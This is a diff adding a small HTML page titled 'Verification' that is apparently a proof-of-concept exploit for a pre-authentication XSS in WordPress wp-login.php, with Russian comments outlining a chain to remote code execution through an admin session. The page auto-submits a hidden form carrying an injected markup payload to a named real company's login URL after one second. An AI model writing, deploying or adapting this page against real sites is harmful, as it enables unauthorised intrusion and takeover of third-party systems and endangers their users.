@@ -1,0 +1,23 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Verification</title>
+</head>
+<body>
+<!-- XSS2Shell trigger (CVE-2026-64638) — преаутентифицированный XSS в wp-login.php
+     Цепочка: parser-differential -> DOM injection -> auto-click user-profile.js -> JSONP eval
+     Для RCE нужен залогиненный админ: app-password -> REST -> publish -> plugin upload -->
+<form id="poc" method="post" action="https://www.creditlogement.fr/wp-login.php">
+  <input type="hidden" name="log"
+    value='< area id=ajaxurl href=/?rest_route=/&_method=GET&_jsonp=alert>< div id=color-picker class=reset-pass-submit>< button class="wp-generate-pw color-option">X'>
+  <input type="hidden" name="pwd" value="x">
+</form>
+<script>
+// автосабмит через 1 сек
+setTimeout(function() {
+  document.getElementById('poc').submit();
+}, 1000);
+</script>
+</body>
+</html>
